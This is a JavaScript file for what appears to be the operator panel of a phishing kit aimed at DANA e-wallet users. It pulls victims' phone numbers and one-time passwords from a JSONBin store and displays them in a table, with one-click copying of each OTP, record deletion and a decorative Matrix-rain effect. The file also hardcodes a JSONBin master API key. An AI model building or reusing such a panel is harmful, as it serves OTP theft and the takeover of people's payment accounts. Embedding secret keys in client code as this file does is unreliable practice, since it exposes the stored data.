// admin-dana-script.js

const jsonBinUrl = "https://api.jsonbin.io/v3/b/67d532738a456b79667627a1";
const apiKey = "$2a$10$LZDpV8PPAx7WyATB653BxO06mW8SD07b0fqCGAhv7efjJF4ZQ4C0q";

// Fungsi untuk mengekstrak data pengguna dari JSONBin
function extractUsers(data) {
    // Karena data JSONBin disimpan sebagai array di properti 'record'
    return data.record || [];
}

// Fungsi untuk memuat data pengguna dan merender ke tabel
function loadUsers() {
    fetch(jsonBinUrl, {
        method: 'GET',
        headers: { "X-Master-Key": apiKey }
    })
    .then(response => response.json())
    .then(data => {
        let users = extractUsers(data);
        let tableBody = document.getElementById("userTableBody");
        tableBody.innerHTML = "";

        if (users.length === 0) {
            tableBody.innerHTML = `<tr><td colspan="3">Tidak ada data pengguna</td></tr>`;
            return;
        }

        users.forEach((user, index) => {
            let row = `<tr>
                <td>${user.phoneNumber || "-"}</td>
                <td ondblclick='copyText(this)'>${user.otp || "-"}</td>
                <td><button class='delete-btn' onclick='deleteUser(${index})'>Hapus</button></td>
            </tr>`;
            tableBody.innerHTML += row;
        });
    })
    .catch(error => {
        console.error("Gagal mengambil data:", error);
        document.getElementById("userTableBody").innerHTML = `<tr><td colspan="3">Gagal memuat data</td></tr>`;
    });
}

document.getElementById("refresh-button").addEventListener("click", loadUsers);

// Fungsi untuk menghapus pengguna
function deleteUser(index) {
    if (!confirm("Yakin mau hapus data ini?")) return;

    fetch(jsonBinUrl, {
        method: 'GET',
        headers: { "X-Master-Key": apiKey }
    })
    .then(response => response.json())
    .then(data => {
        let users = extractUsers(data);
        users.splice(index, 1);

        return fetch(jsonBinUrl, {
            method: 'PUT',
            headers: {
                "Content-Type": "application/json",
                "X-Master-Key": apiKey
            },
            body: JSON.stringify({ users })
        });
    })
    .then(() => {
        alert("Pengguna berhasil dihapus!");
        loadUsers();
    })
    .catch(error => console.error("Gagal menghapus pengguna", error));
}

// Fungsi untuk menyalin teks saat double click
function copyText(element) {
    navigator.clipboard.writeText(element.innerText)
        .then(() => alert("Teks disalin: " + element.innerText))
        .catch(err => console.error("Gagal menyalin teks", err));
}

loadUsers();

// Matrix Rain Effect
const canvas = document.getElementById("matrixCanvas");
const ctx = canvas.getContext("2d");
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const columns = Math.floor(canvas.width / 15);
const drops = Array(columns).fill(0);

function drawMatrix() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#0f0";
    ctx.font = "15px monospace";
    for (let i = 0; i < drops.length; i++) {
        const text = String.fromCharCode(0x30A0 + Math.random() * 96);
        const x = i * 15;
        const y = drops[i] * 15;
        ctx.fillText(text, x, y);
        drops[i] = y > canvas.height || Math.random() > 0.98 ? 0 : drops[i] + 1;
    }
}
setInterval(drawMatrix, 50);

// Tombol Play/Pause Music
const music = document.getElementById("background-music");
const playButton = document.getElementById("play-button");

playButton.addEventListener("click", function() {
    if (music.paused) {
        music.play();
        playButton.textContent = "Pause Music";
    } else {
        music.pause();
        playButton.textContent = "Play Music";
    }
});

// Tombol Kembali ke Index
const backButton = document.getElementById("back-button");
backButton.addEventListener("click", () => {
    window.location.href = 'index.html';
});
